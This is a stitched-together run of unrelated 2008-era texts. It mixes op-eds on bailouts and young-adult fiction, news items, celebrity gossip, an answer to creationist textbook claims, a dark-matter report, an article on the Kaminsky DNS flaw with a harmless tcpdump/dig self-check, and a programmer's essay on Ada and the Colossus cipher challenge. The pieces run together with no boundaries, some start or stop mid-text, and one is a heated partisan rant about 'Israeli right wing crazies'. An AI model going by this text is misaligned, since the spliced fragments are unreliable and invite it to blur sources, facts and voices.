The Iraqi government has said it is proposing U.S. troops end patrols of Iraqi towns and villages by the middle of next year and U.S. combat troops leave Iraq by 2011 .
But Secretary of State Condoleezza
Rice said in a visit to Baghdad last week that no final agreement had been reached .
The Bush administration has sought to steer clear of fixed timetables in negotiating the agreement .
Whenever I hear that a favorite author of mine is working on a young adult novel , my heart sinks .
" Oh , that wo n't be for me , " I say to myself , " I am not a young adult . "
Sure , I know adults can read YA fiction : I read the His Dark Materials trilogy and the Harry Potter books along with the rest of the universe .
But I object to the idea that young people need their own special , segregated genre of books , as if their minds are so dramatically different from adult minds that they require their own category of fantasy .
Once a person has reached adolescence , relegating their reading material to its own gated subgenre seems at best condescending and at worst censorious .
As many critics have pointed out , writing YA fiction does n't mean avoiding so - called adult topics like sex , horror , and politics .
China Mieville has written a dark YA novel called Un Lun Dun , and Cory Doctorow has published the highly - political YA book Little Brother .
It sounds like Paolo Bacigalupi's YA novel will be political , too .
So what exactly separates YA fiction from A fiction ?
It would seem that it 's simply the ages of the protagonists .
YA fiction features teen heroes , and A fiction features those over 18 .
If age of protagonists is the delineator , that means publishers could easily repackage Vernor Vinge 's A Fire Upon the Deep as YA fiction , since at least half the novel is about two young people on a strange planet .
Or hell , why not make Neal Stephenson 's new book Anathem YA too ?
Its protagonist is just 18 years old .
But nobody would think Stephenson 's book was for young people , just as they would n't likely slap " young adult " on the cover of a Vinge tome .
Obviously age is n't the only indicator , then :
There is something more than safe subjects or young characters that makes a book YA .
I think you and I know exactly what that " something " is .
It 's niche marketing .
We 've already got clothing , games , and technologies aimed at teenagers .
Now we have scifi books aimed at them too .
I do n't want you to think that I have some giant objection to niche marketing , because I do n't .
It 's helpful to have bookstores divided up into sections .
What I do n't like is when one of those sections is specifically designed to repel me , to make me think that I should n't be there .

When scifi novels with adolescent protagonists are marketed as " just for adolescents , " a curtain of taboo falls between most adults and that novel .
In an era where there is so much legal panic around relations between adults and young adults , it 's hard to deny your knee - jerk response that there 's something slightly distasteful and pedophilic about an adult reading stories aimed at people under the age of 18 .
I just ca n't get that scene from the movie Happiness out of my head , where we figure out that one of the main characters is a pedophile because he buys Tiger Beat magazine .
What I 'm trying to say is that labeling novels YA in the hope that that will make them " mainstream " may actually backfire .
You will certainly alienate possible adult readers , who feel vaguely nasty for cozying up with a genre aimed at teens .
And I believe in the end you will lose teen readers , who are exactly the sorts of people who dislike being told that their youth bars them from understanding adult novels .
What self - respecting 15 - year - old wants to read " young adult " fiction when she could be reading stuff actually written for adults ?
The beauty of science fiction is that our hypothetical 15 - year - old can read adult fiction and enjoy it just as much as adults do .
Not because scifi is simplistic , but because it usually operates on multiple levels :
One level is devoted to an adventurous plot , and the other seethes with social subtext and commentary .
The most successful scifi novels should work as entertainment for people of any age , and can suggest deeper ideas to people who have been on Earth long enough to want a little contemplation with their space battles .
Many of the recent and forthcoming YA novels in scifi could just as easily be marketed as novels without any particular age designation .
My guess is that young people would read them anyway , just as I read adult novels by Rudy Rucker , John Varley , and Robert Silverberg when I was in the " young adult " target market .
If we really want to open science fiction up to new readers , we wo n't do it by dividing our audience up into smaller and smaller groups .
Nor will we expand the minds of young people by telling them that they should only read specially - designated novels for young people .
Why not admit that teens have a place in the world of adult imagination , and vice versa ?
Adults and teens are different in all kinds of ways , but surely they can meet in the world of fiction .
Since so much scifi is about changing the future , it seems crucial that this genre forge alliances between youth and adults .
We 'll build a better space - faring species together if we do n't deliberately create generational barriers where they are n't necessary .

Americans in recent weeks have added a new word to their political vocabulary : bailout .
They may have known this word before , but recent examples have assuredly serve to inculcate its meaning in their mind .
Bailouts themselves are not bad ; if a company is in financial trouble , it becomes a prime opportunity for an interested investor to buy low in order to sell high ( hopefully ) at a later date .
This is essentially how the market works — we all want to buy things on the cheap .
But bailouts are unique in that the company is clearly about to go under , and thus immediate and drastic action is necessary to prevent its demise .
Companies are saved either through private or public intervention .
Corporate bailouts sponsored by the government are publicly financed , in that the taxpayer foots the bill .
Regardless of whether the money is generated through tax revenue , foreign debt , or printing new money , it is the taxpayer in this situation that suffers ( economically and in other ways ) as a result .
The question I have ( which I have asked too many times before ) is , “ where does the federal government get the authority to bail out a company ? ”
The only defense offered by statist pundits is “ But Company X is too big and important , we just ca n’t let them go under !
Think of what that would do to the economy ! ”
And so on that basis alone ( the perceived catastrophic effect of what would happen if Company X failed ) , those with the purse strings provide the money to bail out one company with our money .
It has happened several times throughout our history , and it ’s happening with increasing frequency as shareholder confidence declines across the board .
The recent bailout of IndyMac will clean out 10 % of the FDIC ’s holdings .
A few more of those , and supposedly insured depositors will begin to worry about their money regardless of which bank they patronize — then we will see what a twenty - first century bank run looks like .
As this article explains ( with a bit of satire ) , the supreme law of the land nowhere grants the federal government the power to steal my money to help a troubled company :
The American Constitution is missing a word .
There was a word left out that our Founders failed to recognize as important .
The word is “ Bailout . ”
There is nothing in that document that allows the government to bailout someone whose house burned down , or a car company , or someone with medical problems , or someone who spent too much on a house they could not afford , or a bank that made bad loans .
To be clear : federal politicians have granted themselves the ability to prevent companies from failing on the subjective , predictive assertion that to do otherwise would lead to economic turmoil .
I contend that it is precisely because of such bailouts ( and all other government - sponsored economic intervention ) that we have such economic turmoil at all .
Robert Lefevre got it right : “ Government is a disease that masquerades as its own cure . ”
Ludwig von Mises had this to say about the government ’s bailout of corporations :
All these champions of interventionism fail to realize that their program thus implies the establishment of full government supremacy in all economic matters and ultimately brings about a state of affairs that does not differ from what is called the German or the Hindenburg pattern of socialism .
If it is in the jurisdiction of the government to decide whether or not definite conditions of the economy justify its intervention , no sphere of operation is left to the market . …
[ T ]he market is free as long as it does precisely what the government wants it to do .
It is “ free ” to do what the authorities consider to be the “ right ” things , but not to do what they consider the “ wrong ” things ; the decision concerning what is right and what is wrong rests with the government .
Thus the doctrine and the practice of interventionism ultimately tend to abandon what originally distinguished them from outright socialism and adopt entirely the principles of totalitarian all - around planning .
( Ludwig von Mises , Human Action , p. 723-4 )
“ Totalitarian all - around planning ” , as Mises called it , is commonly referred to in our day as “ central planning ” .
Such a system exists in the United States in the form of the Federal Reserve , comprised of a few unelected individuals having supreme power over the finances of the economy .
No oversight , no accountability to the people , no audits , and no checks and balances .
They are the ones that bail out companies with forced public financing .
The government and their economic cronies at the Fed are to blame for creating the booms and busts throughout the past century .
And now , despite the fact that they have no Constitutionally - granted power to do so , they want to use our money to save companies with questionable balance sheets , ethics , and business practices .
This may work in the short run , but the ultimate and long - term result is one of financial insolvency .

Perhaps all that work on Liddy has caused something to snap .
Out of all the people to try to honor in an Act dedicated to fighting AIDS , Elizabeth Dole spits in the face of LGBTs by proposing the now - dead Jesse Helms be added to the " Tom Lantos and Henry J. Hyde United States Global Leadership Against HIV / AIDS , Tuberculosis , and Malaria Reauthorization Act of 2008 . "
Here 's the Congressional Record : SA 5074 .
Mrs. DOLE submitted an amendment intended to be proposed by her to the bill S. 2731 , to authorize appropriations for fiscal years 2009 through 2013 to provide assistance to foreign countries to combat HIV / AIDS , tuberculosis , malaria , and for other purposes ; which was ordered to lie on the table ; as follows :
On page 1 , line 5 , strike '' and Henry J. Hyde ' ' and insert '' , Henry J. Hyde , and Jesse Helms '' .
Why is this so unbelievably wrong on so many levels ?
Because of what Jesse Helms said about AIDS :
Joe Jervis of Joe .
My .
God says it all : Jesse Helms , the man who in 1987 described AIDS prevention literature as " so obscene , so revolting , I may throw up . "
Jesse Helms , the man who in 1988 vigorously opposed the Kennedy - Hatch AIDS research bill , saying , " There is not one single case of AIDS in this country that cannot be traced in origin to sodomy . "
Jesse Helms , the man who in 1995 said ( in opposition to refunding the Ryan White Act ) that the government should spend less on people with AIDS because they got sick due to their " deliberate , disgusting , revolting conduct . "

The jury had heard that Flaherty had no recollection of throttling his wife A judge has told a Glasgow pensioner that stopping him going to the pub was a " more meaningful " sentence than a prison term for killing his wife .
Edward Flaherty , 74 , was convicted of strangling 69 - year - old Ina Flaherty with a tie after she refused to give him money to go out drinking .
Lord Matthews said Flaherty 's dementia made him unsuited to prison .
He imposed a year - long restriction of liberty order which will keep him inside his home during opening hours .
The pensioner will be tagged and banned from leaving his home in the city 's Drygate area between 1100 and 2300 BST after being found guilty of culpable homicide .
At the High Court in Glasgow , Lord Matthews told Flaherty that under normal circumstances he would have been given a prison sentence in double figures .
He said : " I have read and considered a number of reports from experts .
It is plain to me that if I were to impose that sort of sentence you would be released in a very short time because prison would not be able to cope with your condition .
The report prepared for the court paints a picture of a man in significant physical and mental decline
Donald MacLeod
Defence QC
" Sentencing you would just be a token gesture .
I am anxious to impose a sentence that restricts your liberty .
" You still go to the pub where you went with your wife .
That must annoy her relatives .
" Not being able to go there will be a more meaningful disposal than a prison sentence which will not last long . "
During the trial the jury heard that Flaherty said he had no recollection of the moment he throttled his wife of 52 years in April last year .
When asked who killed her , he said : " It must have been me .
There are no ghosts running about the house who would have done that . "
Defence QC Donald MacLeod said : " The report prepared for the court paints a picture of a man in significant physical and mental decline .
" There is a clear diagnosis of dementia setting in .
It is a progressive condition and ultimately he will need 24 - hour care .
" I am deeply conscious there has been a death here , but this man is very unwell .
" He was always willing to plead guilty to culpable homicide , but this was flatly rejected by the Crown and that is why a trial was necessary . "

How Much Money Does an Economy Need ?
Solving the Central Economic Puzzle of Money , Prices , and Jobs .
By Hunter Lewis .
Axios Press . Vi + 185 pages .
In Are the Rich Necessary ?
Hunter Lewis showed himself to be a master of dialectics ; and he here applies the same method to monetary theory .
Not content to expound his own views , Lewis carefully explains conflicting standpoints as well .
Lewis does not disguise his own strong commitment to Austrian economics , but the reader of this book will understand not only this position , but its chief competitors as well .
Lewis begins by asking , what kind of prices do we want ?
At first , we might think that stable prices are the order of the day .
If the price level fluctuates , does this not make economic calculation much more difficult ?
If the price level is rising , for example , businessmen may think they are making profits when they are in fact losing money .
They may neglect to discount their paper profits by the rate of inflation .
This position at times won the allegiance of the great monetary economist Irving Fisher , though sometimes , as Lewis notes , Fisher adopted a more inflationist view .
Against the policy of stable prices , though , there are insurmountable objections .
In a free - market economy , as production expands , many prices tend to fall .
Formerly expensive goods now can be produced in large quantities .
This is all to the good , as it makes possible rising standards of living .
As Mises long ago noted , capitalism is a system of " mass production for the masses . "
If these prices fall , then attempts to maintain a stable price level require that other prices be artificially boosted .
Will doing this not introduce shortages and discoordination into the economy ?
Far better to leave things as they are .
The whole point of free markets is to keep reducing prices , so that more and more people can afford to buy .
Why , then , should we want overall prices in our economy to remain stable ?
If most prices fall , as we should hope they will , stable prices overall can only mean that some prices are steeply rising .
These rising prices make everyone poorer , but especially retired and poor people ( p. 5 )
But , supporters of inflation refuse to accept this conclusion .
Even if boosting prices does result in some discoordination , they maintain , the advantages of increasing prices outweigh the disadvantages .
This is particularly so in times of depression and unemployment .
Those who favor deflation and price coordination through the market will say that if unemployment exists , wages need to be adjusted downwards .
Is not such a draconian policy too hard on workers ?
Far better to deal with unemployment through an expansion of spending .
So , at any rate , Lord Keynes contended .

The Best of David Gordon
And while we are at it , how did we get reduced to the atomic weaponry sugar daddy for the Israeli right wing ?
Here 's another question that never seems to be asked .
What in God 's name is the convoluted relation between Muslim fossil fuels and the Israeli right wing ?
Over and over and over again we come back to the Israeli right wing .
The Bush ’s neocon cabal is all of a piece with the most extreme radicals of another country ( our friends and allies ? ) and they have been wagging American foreign policy like a tail for the last eight plus years .
What ever happened to Americans controlling our OWN foreign policy ?
Back to the title of this piece , the question of questions is how did we get metamorphosed into the attack dog of another country ?
It 's OUR children who are being turned into cannon fodder for the agendas of right wing crazies -- both American and Israeli .
Talk about a marriage made in hell , we also can't overlook the vile bond between that army of mutated Christian Fundamentalists ( Christians ? ) and their Israeli counterparts .
A connection which dragging both Israel and Americans straight to hell .
Most of this is never talked about because these psychos keep trying to hide behind the smoke screen of anti Semitism .
But this has NOTHING to do with anti Semitism any more than it has to do with the Jewish community at large ( which seems overwhelmingly to want a two country solution to the Israeli / Palestinian " conflict " ) .
It also has NOTHING to do with the State of Israel in general .
God knows , we do n't want ( or deserve ) the United States of America to be identified with our right wing crazies , and neither does Israel want or deserve that .
For example , we should n't forget that Israel 's Labor Party is courageously more liberal than what used to be the American Democratic Party .
No , the issue is ONLY Israel 's right wing crazies , but these people are off the chart psychotic and righteous .
Multi millionaire and billionaire religious fanatics are the absolute bottom of human spiritual / moral existence .
So why do we bark when they tell us to bark , and why do we bite when the tell us to bite ?
And most of all , why do we slaughter our children when the tell us to slaughter our children ?

Jolie - Pitts Eligible for Child Support
andare eligible to receive $ 2592.81 in parenting subsidies each month as residents of France .
The Jolie - Pitts moved their family into Chateau Miraval in the south of France just before the births of twins Knox and Vivienne .
Pitt registered the family at the town hall in nearby Brignoles , qualifying them for the benefits which are available to all families , regardless of income .
Although it is unlikely Brad and Angelina will cash in , they are technically eligible for a " nanny payment " of $ 975.84 a month to help with childcare , and an " orphan allowance " of $ 508.97 for each of their three adopted children .
The $ 2,592.81 total would be payable by check each month .
" We do not discuss individual benefits cases , " said a spokeswoman for the Brignoles council , " But can confirm that all resident local families with young children are eligible for certain benefits . "
Jolie gave birth to twins Knox and Vivienne on July 12 .
The couple have three adopted children - Maddox , six , Pax , four and three - year - old Zahara , and a biological daughter , Shiloh , who was born in Namibia two years ago .

The SANS Institute installed and tested out Apple ’s fix for the underlying flaw in the domain name system ( DNS ) protocol , and found that a patched copy of Mac OS X 10.5 Leopard ( the desktop version , not Leopard Server ) still suffers from the risky technique that makes DNS vulnerable to exploitation .
This exploitation , so far , seems extremely unlikely , but we wo n’t know how unlikely until security researcher Dan Kaminsky , the discoverer of this flaw , provides full disclosure on 06 - Aug - 08 in his Black Hat conference talk , “ Black Ops 2008 : Its ( sic ) the End of the Cache as We Know It . ”
As Rich Mogull and I noted in “ Apple Fails to Patch Critical Exploited DNS Flaw ” ( 2008 - 07 - 24 ) , servers are at a high risk from this DNS vulnerability .
The flaw allows an attacker to send tens of thousands of fake responses for a DNS query to a server , which then poisons the server ’s DNS entries if the attacker matches the right pattern with their forged information before the legitimate response arrives from the DNS server for the domain that ’s being queried .
However , computers used by individuals without DNS server software in operation are also vulnerable to this flaw in DNS ; we just do n’t know yet quite how vulnerable .
With servers rapidly being patched worldwide , it ’s likely that the low - hanging fruit has largely disappeared , and attacks would then turn to clients – if clients are readily exploitable , too .
Clients use stub resolvers , which forward requests for DNS answers to a full - blown , or recursive , DNS server run by their company , ISP , network provider , or co-location facility .
These clients pass their requests along , and it seems unlikely that they could be attacked directly unless an attacker had a computer on the same local network segment as the exposed system .
In that case , the attacker would have a panoply of other network information poison available , and could disrupt DNS in a more efficient manner .
The DNS flaw relies on predictability in how ports are assigned to outbound requests for domain name lookups in a DNS query .
An attacker forces a DNS server to look up a domain using a DNS server the attacker controls , and from that obtains the current port number being used for requests .
If the ports are sequential – each query increments by one the port number used for each subsequent request – then the attacker starts sending forged requests using ports numbered just above the one it sniffed .
This is part of the question about client vulnerability : it ’s very hard to force a client to look up an evil domain to prime the pump because clients do n’t answer DNS queries to begin with , and typically are n’t running mail servers which can be gamed when an attacker sends incoming email with an evil domain in the return address .
By increasing entropy – choosing a random port for each request – a patched DNS server prevents attackers from producing enough packets quickly enough to win the race with the legitimate DNS server , such that they cannot – statistically speaking – poison the DNS cache .
( This is a patch , not a fix , actually ; DNS itself must be overhauled to remove the fundamental weakness . )
I checked out my updated Leopard desktop system , and , sure enough , I saw precisely what SANS reported : sequential UDP ports returned in response to outbound requests , regardless of what this entails .
If you ’d like to duplicate the SANS experiment , follow these steps :
Launch Applications > Utilities > Terminal .
Type the following , entering your administrative password when prompted .
sudo tcpdump | grep domain
Open another Terminal window , and in it , type the following , press Return , and then press up arrow and Return a few more times to enter the command repeatedly : dig tidbits.com
In the window with tcpdump running , you should see a series of lines that look like the following .
15:06:53.900835 IP 192.168.1.16.49229 > yourDNSserver.com.domain : 5228 + PTR ? 16.1.168.192.in-addr.arpa . ( 43 )
15:06:53.947838 IP 192.168.1.16.49230 > yourDNSserver.com.domain : 48400 + PTR ? 11.1.168.192.in-addr.arpa . ( 43 )
15:06:55.003628 IP 192.168.1.16.49231 > yourDNSserver.com.domain : 15730 + PTR ?
7.34.232.205.in-addr.arpa . ( 43 )
Press Control - C ( not Command - C ) to stop tcpdump from running .
( If you do n’t see any results in step 4 , you need to specify the network adapter with the tcpdump command .
You can try en1 , en2 , en3 , and so forth as in the following command . ) sudo tcpdump - i en1 | grep domain
In the example above , you ’ll notice 49229 , 49230 , and 49231 after “ 192.168.1.16 ” .
Those are the port numbers used for each request , and the fact that they ’re sequential shows that Leopard is still vulnerable as a DNS client .
We ’re not back where we started , because clients are enormously harder to attack .
But it ’s still a hole that needs to be filled .
We just wo n’t know how deep a hole until next week .
Many opponents of the Bush administration ’s invasion and occupation of Iraq have always argued that this conflict is an irrelevant and even counterproductive sideshow to the real " war on terrorism " in Afghanistan .
In fact , Barack Obama led the parade to initiate a troop surge in Afghanistan after having opposed it in Iraq .
The more hawkish John McCain , not to be outdone by a weak - kneed Democrat , proposed that even more troops be sent to Afghanistan .
In American politics after 9/11 , it seems that candidates have to support some sort of war or they will be perceived as being too wimpy to get elected .
Only a small minority of foreign policy gadflies has doubted whether any war on terrorism is needed in either Iraq or Afghanistan .
Now a new report by RAND , the government ’s own captive think tank , supports this small band of renegades .
The study , " How Terrorist Groups End : Lessons for Countering al - Qaeda , " written by terrorism experts Seth Jones and Martin Libicki , followed more than 600 terrorist groups , including al - Qaeda , over the long - term .
The report concluded that the administration ’s war on terrorism has not significantly degraded al - Qaeda and that the group has morphed into a more formidable enemy .
In fact , al - Qaeda has perpetrated more attacks after September 11 , 2001 than before it .
RAND deduced that the best way to kill a terrorist group is to capture or kill its leaders .
This task is best carried out , according to the study , by law enforcement , intelligence , and , if needed , troops from the local country .
Instead of giving terrorists the exalted status of warriors , they should be deemed criminals .
In other words , the authors conclude that in most past cases in which terrorist groups have been defeated by getting their leaders , local law enforcement did the job .
They say that when troops are needed , local troops have a better understanding of the culture and terrain and thus have more legitimacy than do U.S. forces .
In fact , the study says that the presence of U.S. forces on Muslim soil can create more terrorists to fight ; thus the authors argue that the U.S. military should confine itself to training the locals .
It is nice when government - paid researchers can provide empirical data to confirm what should have been obvious to any informed citizen years ago !
After a major terrorist crime , such as the one on 9/11 , the objective should be to get the perpetrators .
The U.S. government should not militarily invade countries and try to change their form of government , economic system or money - making activities ( for example , growing opium ) .
This applies to both Afghanistan and Iraq .
It might be nice to have free market economies and democratic governments in these remote places , but it is a diversion from the main show : getting the terrorist leaders .
The niggling fact is that Osama bin Laden , Ayman al - Zawahiri and their merry band of followers are not likely to be in Afghanistan or Iraq , but in Pakistan .
So the United States must convince the local government in Pakistan to apprehend them .
Right now , some in the Pakistani intelligence service , with close ties to Islamist militants in the Taliban , probably know where they are hiding .
But as long as these outlaws are on the loose , the government of Pakistan pockets billions per year in U.S. military and economic aid .
So the Pakistanis have no incentive to get the al - Qaeda leaders .
The United States should give up the losing nation - building distraction in Afghanistan ( as well as in Iraq ) and offer to withdraw NATO forces from that country , thus letting the resurgent Pashtun allies of Pakistani intelligence services the Taliban take over the eastern and southern parts of the Afghan landscape .
Pakistan has long wanted influence in neighboring Afghanistan and wholeheartedly supported the Taliban rulers of that country before 9/11 .
In return , for increased influence in Afghanistan through its Taliban proxy , Pakistan would have to find the al - Qaeda leadership and turn it over to the United States .
( If a stick is needed , the U.S. could threaten to cut off the billions in military and economic aid Pakistan receives if the Pakistanis do not produce the al - Qaeda chieftains . )
Although the Taliban were harsh rulers of Afghanistan , the U.S. has few other options to motivate the Pakistani government to fork over the al - Qaeda kingpins , which still threaten the U.S. homeland .
As harsh as they are , the Taliban do n’t so threaten the United States .
The counterproductive war on terrorism must end and we must motivate the local Pakistani government to catch the criminals that are harbored in its midst .
A. Fish , amphibians , reptiles , birds , and mammals all are post - Cambrian .
We would recognize very few of the Cambrian organisms as “ modern ” ; they ’re in fact at the roots of the tree of life , showing the earliest appearances of some key features of groups of animals - but not all features and not all groups .
Researchers are linking these Cambrian groups using not only fossils but also data from developmental biology .
3. Homology .
Why do textbooks define homology as similarity due to common ancestry , then claim that it is evidence or common ancestry  a circular argument masquerading as scientific evidence ?
A : The same anatomical structure ( such as a leg or an antenna ) in two species may be similar because it was inherited from a common ancestor ( homology ) or because of similar adaptive pressure ( convergence ) .
Homology of structures across species is not assumed , but tested by the repeated comparison of numerous features that do or do not sort into successive clusters .
Homology is used to test hypotheses of degrees of relatedness .
Homology is not “ evidence ” for common ancestry : common ancestry is inferred based on many sources of information , and reinforced by the patterns of similarity and dissimilarity of anatomical structures .
4. Vertebrate embryos .
Why do textbooks use drawings of similarities in vertebrate embryos as evidence for their common ancestry  even though biologists have known for over a century that vertebrate embryos are not most similar in their early stages , and the drawings are faked ?
A : Twentieth - century and current embryological research confirms that early stages ( if not the earliest ) of vertebrate embryos are more similar than later ones ; the more recently species shared a common ancestor , the more similar their embryological development .
Thus cows and rabbits - mammals - are more similar in their embryological development than either is to alligators .
Cows and antelopes are more similar in their embryology than either is to rabbits , and so on .
The union of evolution and developmental biology  “ evo - devo ”  is one of the most rapidly growing biological fields .
“ Faked ” drawings are not relied upon : there has been plenty of research in developmental biology since Haeckel ( long - discredited drawings that were used in textbooks 20 years ago ) and in fact , hardly any textbooks feature Haeckel ’s drawings , as claimed .
Astronomers find least luminous , most dark matter - dominated galaxy
Tue , 01 Jan 2008 ANI
Washington , September 19 ( ANI ) : A team of astronomers has discovered the least luminous , most dark matter - dominated galaxy known to exist .
The galaxy , called Segue 1 , is one of about two dozen small satellite galaxies orbiting our own Milky Way galaxy .
The ultra - faint galaxy is a billion times less bright than the Milky Way , according to the team 's results .
But despite its small number of visible stars , Segue 1 is nearly a thousand times more massive than it appears , meaning most of its mass must come from dark matter .
" I 'm excited about this object , " said Marla Geha , an assistant professor of astronomy at Yale and the paper 's lead author .
" Segue 1 is the most extreme example of a galaxy that contains only a few hundred stars , yet has a relatively large mass , " she added .
Geha , along with her colleague Josh Simon at the California Institute of Technology , has observed about half of the dwarf satellite galaxies that orbit the Milky Way .
These objects are so faint and contain so few stars that at first they were thought to be globular clusters
Â­ tightly bound star clusters that also orbit our host galaxy .
But , by analyzing the light coming from the objects using the Keck telescope in Hawaii , Geha and Simon showed that these objects are actually galaxies themselves , albeit very dim ones .
Looking only at the light emitted by these ultra - faint galaxies , Geha and her colleagues expected them to have correspondingly low masses .
Instead , they discovered that they are between 100 and 1000 times more massive than they appear .
Invisible dark matter , according to Geha , must account for the difference .
Although dark matter does n't emit or absorb light , scientists can measure its gravitational effect on ordinary matter and believe it makes up about 85 percent of the total mass in the universe .
Finding ultra - faint galaxies like Segue 1 , which is so rife with dark matter , provides clues as to how galaxies form and evolve , especially at the smallest scales .
" These dwarf galaxies tell us a great deal about galaxy formation , " Geha said .
" For example , different theories about how galaxies form predict different numbers of dwarf galaxies versus large galaxies .
So just comparing numbers is significant , " she added .
It 's only recently that astronomers have discovered just how prevalent these dwarf satellite galaxies are , thanks to projects like the Sloan Digital Sky Survey .
Geha predicts that astronomers will find even more as they continue to sift through new data .
" The galaxies I now consider bright used to be the least luminous ones we knew about , " she said .
" It 's a totally new regime .
This is a story that 's just unfolding , " she added .

Znaur Gassiyev , the Speaker of South Ossetia ’s parliament , said the enclave would formally join Russia " in several years " or possibly earlier .
This had been " firmly stated by both leaders ” during their meeting in Moscow .
Joachim Schüeth is the winner of National Museum of Computing 's Colossus Cipher Challenge .
Using his laptop , Schüeth unravelled a code transmitted from the Heinz Nixdorf Museum in Germany , from a Lorenz SZ42 Cipher machine , used by the German High Command to relay secret messages during the World War II .
Speaking in front of Colossus at Bletchley Park , Schüeth said : " It was unfair because I was using a modern PC , while Colossus was created more than 60 years ago .
It really is astonishing and humbling that the world 's first programmable , digital computer was created in the 1940s .
Without those Bletchley Park pioneers , I would be out of a job . "
According to a famous quote by Max Planck , the founder of quantum physics , truth never wins -- its opponents just go extinct .
What Planck described in the context of paradigm shifts in natural sciences can often be observed in a similar fashion in computer technology .
For example , the increasing use of Linux as an alternative operating system for applications in industry and government did not emerge because senior management could be convinced , but because a new generation of IT specialists who grew up using Linux on their home computers is shifting into management positions .
( For reasons of code maturity and stability I prefer the BSD derivatives over Linux , but that is a different story . )
During the work for my diploma and Ph.D. in Physics in the research group of Professor Bodenstedt at the University of Bonn , I had a similar experience concerning the choice of programming languages .
We were using a complex apparatus for our experiments which had been designed by Bodenstedt .
Together with two other undergraduates we were three newbies in the group , and there was the generation of older students who just finished their Ph.D.s and soon left to take up jobs in industry .
They had written software in Fortran to control the apparatus and to do the data evaluation on a PDP - 11/23 .
It was decided around that time that the PDP was to be retired and replaced by a VME bus system .
That system came with a C compiler , but the elder students told us -- before they left -- that C was an awful language and that programs written in it were hard to read .
They advised us to continue programming in Fortran when porting the software to the new system .
Sure enough , as they had left , we were happy to do all the programming in C rather than Fortran .
And although I had taken a course in Fortran before and was about equally familiar with Fortran and C at the time , I did not find the Fortran programs easy to read at all because of the heavy use they had made of common blocks ( named groups of global variables ) .
Although I missed in C some of the features that Fortran provided and which Ada now gives me back ( such as runtime boundary checks , compiler generated error messages which pinpoint the line of source code where something went wrong at run time , or the ability to declare variable sized arrays without the clumsy use of malloc ) , I was convinced that C was the better choice for the project .
The moral of that experience to me was that I did not want to become like those older students .
Although not in fear of going extinct , I decided to keep an open mind towards other programming languages .
Whenever I hear someone else , especially younger people , talk about a programming language that they really like , I have a look at it to see what its value may be .
The list of languages I came across that way includes C++ , Java , Haskell , and Python .
I vaguely remember also flipping through the pages of a book on Ada at a local book store some 10 years back , but it did not catch me at the time .
First Contact With Ada
A friend of mine works for the automotive industry and told me a while back that for safety reasons they were only allowed to use MISRA -C in a certain project .
The MISRA standard defines a language subset of C through a long list of rules that forbid the use of dangerous C features .
Because I work in IT security consulting and have seen source code in a wide range of quality during software reviews , it was interesting to see what code practices are used in safety critical systems .
When something goes wrong with the security products that we evaluate at work , the damage is usually not catastrophic .
If a design or implementation error goes unnoticed , someone might loot a bank account , steal a car , or watch Pay TV without paying .
This is really minor damage compared to the loss of lives that could result from a failure of a safety critical system .
Although defending against a smart attacker requires different techniques than preventing accidents , the IT security community can certainly learn from the practices used in safety critical systems design .
It was while searching the web for keywords like " software " and " safety " that I fully became aware of Ada .
Its mentioning was ubiquitous in the safety community .
There were reports , for example , that a large airplane manufacturer only allows Ada in the development of critical software components for its aircrafts .
There was also an analysis of the crash of the Ariane 5 501 rocket during its virgin flight , and a piece of Ada source code from the control system was shown .
Ada was not to be blamed for the collective failure of developers and management , and to me this was just another example that Ada is used in high - profile applications .
There was also a comparison with MISRA-C which concluded that 80 percent of the MISRA rules are not applicable to Ada because the language does not allow to do the many dangerous things that C does .
One report stated that while porting an application from Java to Ada , a design error was discovered because of the strong emphasis that Ada puts on variable types .
Ada was favored so unanimously in the safety community that there had to be more to it than just someone being too lazy to learn another language .
So I decided to have a closer look at Ada , and I really was surprised .
I had not expected to find in Ada all the features of a modern programming language .
For example , the concepts of object - oriented languages like data abstraction , information hiding , inheritance , and overloading of functions and operators are all there , plus useful features like named arguments .
I had thought that most of these had been inventions of newer languages .
That any discrete type can be used as an array index type , not just the predefined integer type , is a feature that sets Ada aside from most languages that I have seen so far .
Array boundaries are inherent attributes of an array in Ada and thus passed along when an array is used as a function or procedure argument , helping the programmer in avoiding index overflows .
This list of features is certainly not complete , but I was so impressed by the strengths of Ada that I decided to seriously learn the language .
Although it is not as quickly grasped as Python , for example , the concepts of Ada are clearly thought out , logical and more easily remembered than those of C++ or Java .
The simplest solution to a problem is usually the least troublesome one to use , although it may not be the easiest one to find .
This rule is often neglected in the design of IT systems , but my impression is that the designers of Ada thought twice before adopting any concept or language feature .
The Cipher Event
It was during the time I was learning Ada that I heard of the Cipher Event which was organized by the British National Museum of Computing to celebrate the rebuild of Colossus Mark 2 at Bletchley Park .
The Colossus machines had been used during World War II by the codebreakers in Bletchley Park to decipher the telegraph messages between high - level command stations of Nazi Germany .
The radio teletype traffic was encrypted with a Lorenz SZ42 cipher machine , codenamed " Tunny " by the British codebreakers .
Colossus was an ingeniously constructed , highly specialized computing machine , which efficiently implemented statistical algorithms used to break the keys of intercepted transmissions .
As one of the first computers , Colossus was far ahead of its time .
During the Cipher Event , texts encrypted with a real SZ42 were transmitted from the amateur radio station at the Heinz Nixdorf Museum in Paderborn , Germany , to a receiving station in Britain .
Two teams would then compete in decrypting the messages , one using the reconstructed Colossus machine , and one using a PC program that emulates Colossus in software .
The announcement of the Cipher Event also invited radio amateurs around the world to receive the messages and try their hand at decrypting them .
Being a radio amateur myself and dealing with cryptography as part of my work in IT security , this was an intriguing challenge to me .
It is easy to produce a theoretical estimate that a modern computer could be faster than Colossus , but it was a real technical challenge to actually intercept the radio signals and to break the key of the messages in real time .
I figured that standard teletype modems and software would not be of much use , because the cipher stream contains non-printable characters ( control characters of the Baudot code ) which might not be recorded properly , and also because the historical tone frequencies were going to be used .
In addition , any loss of a character in the received ciphertexts means that the following text is no longer in sync with the steps of the SZ42 cipher algorithm .
Recording a wrong character from time to time does not prevent the code breaking , but loosing characters does .
I figured that I would need a special reception software to analyze the audio data , with a robust method of clock recovery .
To perform the subsequent cryptanalysis , I decided to also write my own software , based on detailed material on the SZ42 and its cryptographic weaknesses that is available on the Internet .
An important decision to make was which programming language to choose .
I quickly ruled out Python because of the low performance of a scripting language .
Anyways , I was taking part in a competition where speed mattered , so I wanted a compiled language .
The Cipher Event was still two months away , but I knew I would find time to seriously work on the project only during weekends .
Thus the speed of code development was a factor that had to be considered .
After about 16 years of intensive use of C , I felt proficient in that language , but had only studied Ada for about half a year during my spare time , writing humble programs like a Sudoku solver .
